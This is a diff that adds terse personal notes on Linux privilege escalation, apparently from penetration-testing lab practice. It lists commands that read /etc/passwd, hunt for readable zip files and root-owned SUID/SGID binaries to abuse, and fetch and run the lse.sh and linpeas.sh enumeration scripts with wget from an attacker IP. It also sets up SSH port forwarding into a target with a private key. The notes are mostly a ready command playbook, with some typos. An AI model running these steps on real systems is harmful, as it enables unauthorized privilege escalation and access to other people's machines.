@@ -1,0 +1,26 @@
+cat /etc/passwd
+
+find for any particular file type, try zip, dbdx:
+find / -type f -readable -name '*.zip' -ls 2>/dev/null
+
+find all root-owned SUID and GUID binaries:
+find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null
+#Then use GTFObins to determine how to abuse.
+
+lse.sh
+wget http://192.168.45.183:443/lse.sh && chmod 700 lse.sh
+
+    ./lse.sh -l1 # shows interesting information that should help you to privesc
+    ./lse.sh -l2 # dump all the information it gathers about the system
+    
+
+
+wget http://192.168.45.183:443/linpeas.sh && chmod 700 linpeas.sh
+./linpeas.sh
+
+if you find there is anything is listening lets say 127:0.0.1:8000
+then try to look for what it is by 
+on kali, its called local POrt forwarding
+```
+ssh -i id_ecdsa anita@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
+```
